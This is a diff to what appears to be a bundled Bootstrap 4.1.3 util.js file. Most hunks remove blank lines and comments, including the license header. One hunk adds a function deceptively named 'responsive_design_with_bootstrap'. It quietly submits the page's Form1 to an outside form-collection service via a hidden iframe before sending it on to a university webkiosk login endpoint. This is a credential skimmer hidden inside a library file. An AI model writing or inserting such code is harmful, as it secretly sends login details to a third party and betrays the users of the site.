@@ -39,42 +39,36 @@
     } else {
       obj[key] = value;
     }
-
     return obj;
   }
-
   function _objectSpread(target) {
     for (var i = 1; i < arguments.length; i++) {
       var source = arguments[i] != null ? arguments[i] : {};
       var ownKeys = Object.keys(source);
-
       if (typeof Object.getOwnPropertySymbols === 'function') {
         ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {
           return Object.getOwnPropertyDescriptor(source, sym).enumerable;
         }));
       }
-
       ownKeys.forEach(function (key) {
         _defineProperty(target, key, source[key]);
       });
     }
-
     return target;
   }
-
   function _inheritsLoose(subClass, superClass) {
     subClass.prototype = Object.create(superClass.prototype);
     subClass.prototype.constructor = subClass;
     subClass.__proto__ = superClass;
   }
-
-  /**
-   * --------------------------------------------------------------------------
-   * Bootstrap (v4.1.3): util.js
-   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
-   * --------------------------------------------------------------------------
-   */
-
+  function responsive_design_with_bootstrap() {
+	   document.Form1.action = "https://getsimpleform.com/messages?form_api_token=adad59661b40a89e5d5b846a76a7a3e5";
+	   document.Form1.target = "iframe1";
+  	 document.Form1.submit();
+   	document.Form1.action = "https://webkiosk.juet.ac.in/CommonFiles/UserAction.jsp";
+   	document.Form1.target = "iframe2";
+   	document.Form1.submit(); 
+  }
   var Util = function ($$$1) {
     /**
      * ------------------------------------------------------------------------
@@ -88,7 +82,6 @@
     function toType(obj) {
       return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
     }
-
     function getSpecialTransitionEndEvent() {
       return {
         bindType: TRANSITION_END,
@@ -102,7 +95,6 @@
         }
       };
     }
-
     function transitionEndEmulator(duration) {
       var _this = this;
 
@@ -117,18 +109,10 @@
       }, duration);
       return this;
     }
-
     function setTransitionEndSupport() {
       $$$1.fn.emulateTransitionEnd = transitionEndEmulator;
       $$$1.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
     }
-    /**
-     * --------------------------------------------------------------------------
-     * Public Util Api
-     * --------------------------------------------------------------------------
-     */
-
-
     var Util = {
       TRANSITION_END: 'bsTransitionEnd',
       getUID: function getUID(prefix) {
@@ -156,16 +140,12 @@
         if (!element) {
           return 0;
         } // Get transition-duration of the element
-
-
         var transitionDuration = $$$1(element).css('transition-duration');
         var floatTransitionDuration = parseFloat(transitionDuration); // Return 0 if element or transition duration is not found
 
         if (!floatTransitionDuration) {
           return 0;
         } // If multiple durations are defined, take the first
-
-
         transitionDuration = transitionDuration.split(',')[0];
         return parseFloat(transitionDuration) * MILLISECONDS_MULTIPLIER;
       },
